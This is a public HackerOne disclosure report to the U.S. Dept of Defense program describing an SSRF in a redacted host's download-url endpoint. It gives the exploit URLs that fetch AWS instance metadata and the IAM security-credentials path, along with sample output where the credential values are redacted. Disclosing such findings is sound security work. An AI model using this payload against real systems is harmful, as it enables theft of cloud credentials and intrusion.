---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/server-side-request-forgery-ssrf
  - env/cloud
  - stack/aws
  - vuln/ssrf
  - vuln/secrets-leak
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2022-10-14
submitted: 2022-07-04T14:01:31.594Z
bounty_usd: 1000
votes: 57
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "rohsec"
source: "https://hackerone.com/reports/1624140"
title: "SSRF to read AWS metaData at https://█████/ [HtUS]"
---
# SSRF to read AWS metaData at https://█████/ [HtUS]

> **Severity:** Critical | **Bounty:** 1,000 USD | **Votes:** 57 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-10-14

- Report: [https://hackerone.com/reports/1624140](https://hackerone.com/reports/1624140)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2022-07-04T14:01:31.594Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello Team,
While researching your program I found that the domain https://████/ is vulnerable to Server Side Request Frogery Attacks via the url parameter. 
An attacker is able to fetch the aws metadata abusing the SSRF at https://████████/
============================SUMMARY=========================
## Vulnerable URL:
https://███████/

## Vulnerable Path:
/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/

## Final Exploit URL:
https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/

## Exploited AWS metadata
```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
```

## Exposed Credentials:
https://█████████/api/v1/download-url?url=http://169.254.169.254/2021-07-15/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```
{
  "Code" : "Success",
  "LastUpdated" : "2022-07-04T11:22:59Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "███",
  "SecretAccessKey" : "████",
  "Token" : "████
  ```
===========================STEPS TO REPRODUCE==========================
1) Go to the above Exploit URL, i.e; https://█████/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/
2) You will see the AWS Metadata being fetched and exposed.

## Impact

An attacker is able to explore and fertch the AWS metadata via the SSRF. This SSRF can be used to perform other attack vectors as well such as scanning internal ports. A successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
